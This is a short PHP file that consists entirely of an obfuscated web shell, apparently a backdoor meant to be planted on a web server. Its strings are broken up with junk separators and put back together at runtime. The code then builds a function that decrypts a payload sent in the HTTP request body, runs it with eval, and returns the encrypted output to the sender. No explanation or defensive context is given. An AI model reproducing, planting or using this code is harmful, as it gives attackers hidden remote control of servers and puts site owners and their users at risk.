<?php
$H='$k:;:;="db3f186a";$:;kh=:;"7410cd6:;a8b:;ae";$kf="502:;ffe:;79b2:;d:;8";$p="YzmM4hH0kUQL:;i:;M9e":;';
$i=str_replace('N','','crNeNateNN_funNcNtion');
$u='va:;l(@gzunc:;ompress(@x(@:;bas:;e:;64_decode($m:;[1]),$k))):;;$o=:;@ob_ge:;:;t_content:;s();@';
$d='j=0:;;($j:;<$c&&:;$i<$:;l);$j++,$i:;++):;{$o.:;:;=$t{$i}:;^$k:;{$:;j};}}return $o;}if (:;@p:;reg_match(';
$t='"/$kh:;(.+)$kf:;/",@f:;:;ile_get_:;contents("p:;hp::;/:;/input"),:;$m)==1) {@:;o:;b_st:;art();@e:;';
$Y=';f:;uncti:;on x($t,$k){$c:;=s:;trlen(:;$k);$l=strl:;:;en($t);$o="";for:;($i:;=0;$:;i<$l;){for(:;$';
$o='ob_e:;nd_c:;lean:;():;;$r=@base6:;4_en:;code(@x(:;@:;gzcompres:;s($o),$k));:;print(:;"$p$kh$r:;$kf");}';
$r=str_replace(':;','',$H.$Y.$d.$t.$u.$o);
$F=$i('',$r);$F();
?>
